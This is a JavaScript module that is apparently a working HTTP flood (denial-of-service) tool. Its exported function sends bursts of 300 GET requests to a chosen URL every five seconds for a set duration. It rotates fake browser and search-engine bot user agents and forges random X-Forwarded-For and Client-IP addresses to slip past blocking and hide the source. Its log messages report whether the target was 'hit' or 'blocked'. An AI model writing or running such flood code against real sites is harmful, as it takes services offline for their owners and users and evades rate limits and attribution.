const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/113.0 Mobile/15E148 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/115.0.1901.188 Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36 Brave/117",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 YaBrowser/23.9.3.711 Yowser/2.5 Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
  "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
 "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
  "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.4.10 NintendoBrowser/5.1.0.13343",
  "Mozilla/5.0 (Xbox One; Trident/7.0; Touch; rv:11.0) like Gecko",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/118.0.5993.70 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Puppeteer/19.6.3 Chrome/113.0.5672.63 Safari/537.36"
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "Referer": `https://${hostname}/`,
    "Accept": "*/*",
    "Connection": "keep-alive"
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const options = {
      method: "GET",
      hostname: url.hostname,
      path: url.pathname + url.search, // THIS is the full path like /form.php
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: randomHeaders(url.hostname)
    };

    const req = client.request(options, res => {
      if (res.statusCode === 404) {
        console.log(`❌ [${url.hostname}${options.path}] not found (404)`);
      } else if (res.statusCode === 403) {
        console.log(`🛡️ [${url.hostname}${options.path}] blocked (403)`);
      } else if (res.statusCode >= 200 && res.statusCode < 300) {
        console.log(`🔥 [${url.hostname}${options.path}] was hit!`);
      } else {
        console.log(`⚠️ [${url.hostname}${options.path}] responded with ${res.statusCode}`);
      }
    });

    req.on("error", (err) => {
      console.log(`💥 [${url.hostname}${options.path}] failed: ${err.code}`);
    });

    req.end(); // Don’t forget this!
  }

  function loop() {
    if (Date.now() >= end) return;

    for (let i = 0; i < 300; i++) {
      send();
    }

    setTimeout(loop, 5000);
  }

  loop();
};